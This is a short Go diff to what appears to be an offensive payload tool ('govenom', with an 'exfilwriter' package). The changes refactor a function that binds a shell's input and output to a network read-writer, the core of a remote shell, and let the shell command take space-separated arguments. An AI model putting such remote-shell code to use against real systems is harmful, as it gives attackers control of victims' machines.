@@ -7,6 +7,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"strings"
 	"time"
 
 	"govenom/exfilwriter"
@@ -46,7 +47,7 @@ func determineShellCommand(prioritizedChoices [][]string) (shell string, args []
 
 func attachShell(rw io.ReadWriter, shellBinary string, args ...string) error {
 	cmd := exec.Command(shellBinary, args...)
-	cmd.SysProcAttr = getSysProcAttr()
+	cmd.SysProcAttr = sysProcAttr()
 	cmd.Stdin = rw
 	cmd.Stdout = rw
 	cmd.Stderr = rw
@@ -99,7 +100,7 @@ func main() {
 		}
 	}
 
-	shellBinary, args, err := determineShellCommand([][]string{{shell}})
+	shellBinary, args, err := determineShellCommand([][]string{strings.Split(shell, " ")})
 	if err != nil {
 		log.Fatal(err)
 	}
